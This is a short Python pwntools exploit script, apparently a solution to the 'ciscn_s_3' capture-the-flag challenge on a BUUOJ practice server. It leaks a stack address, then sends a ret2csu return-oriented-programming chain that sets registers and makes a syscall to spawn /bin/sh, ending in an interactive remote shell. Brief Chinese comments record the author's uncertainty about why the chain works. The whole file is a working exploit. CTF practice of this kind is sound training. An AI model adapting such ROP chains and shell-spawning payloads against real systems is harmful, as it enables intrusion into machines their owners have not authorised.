from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')

elf = ELF('./ciscn_s_3')
# io = process('./ciscn_s_3')
io = remote('node4.buuoj.cn',27821)

exec_gadget = 0x4004E2
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059A
mov_rdxr13_call = 0x0400580
pop_rdi_ret = 0x4005a3
syscall = 0x400517
offset = 0x7fffffffddf8 - 0x7fffffffdce0

main_addr = elf.symbols['vuln']
print(hex(main_addr))

payload = b'/bin/sh\x00'*2 + p64(main_addr)
io.sendline(payload)
io.recv(0x20) #前0x20字节没有用
bin_sh = u64(io.recv(8)) - offset
print('bin_sh栈上地址为：',hex(bin_sh))


rbx = 0
rbp = 0
r12 = bin_sh + 0x50 #call r12+rbx*8
r13 = 0 #rdx = r13
r14 = 0 #rsi = r14
r15 = 0 #edi = r15


#常规ret2csu是将rbp=1，第二段csu是call调用完毕后返回csu函数继续执行，重复一次第一段csu后ret。但不知道为什么本题是r12赋值栈上内容exec_gadget也没有重复第一段csu
payload = b'/bin/sh\x00'*2 + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
payload = payload + p64(mov_rdxr13_call) + p64(exec_gadget)
payload = payload + p64(pop_rdi_ret) + p64(bin_sh) + p64(syscall)
io.sendline(payload)
io.interactive()